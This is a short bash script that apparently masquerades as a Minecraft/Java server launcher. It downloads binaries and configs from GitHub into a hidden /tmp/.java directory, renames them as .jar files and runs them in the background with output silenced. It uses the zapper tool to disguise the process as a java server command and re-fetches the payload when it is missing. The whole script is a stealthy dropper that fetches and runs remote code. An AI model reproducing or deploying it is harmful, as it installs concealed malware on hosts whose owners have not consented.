#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/astra/c1.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/astra/c1.json -o conf.json
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -Xmx512M -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/bots.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] ; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
